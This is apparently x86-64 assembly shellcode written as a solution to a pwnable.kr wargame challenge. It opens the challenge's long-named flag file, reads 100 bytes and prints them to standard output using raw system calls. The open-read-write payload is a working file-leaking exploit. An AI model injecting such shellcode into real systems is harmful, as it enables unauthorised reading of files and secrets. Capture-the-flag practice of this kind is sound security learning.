section .data
	msg db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
section .bss
	buffer: resb 100

section .text
	global _start

_start:
	mov rdi, msg
	xor rsi, rsi
	xor rdx, rdx
	xor rax, rax
	add al, 2
	syscall

	mov rdi, rax
	mov rsi, buffer
	mov rdx, 100
	xor rax, rax
	syscall

	mov rdi, 1
	mov rsi, buffer
	mov rdx, 100
	xor rax, rax
	inc rax
	syscall

	xor rax,rax
	mov rax, 60
	mov rdi, 0
	syscall
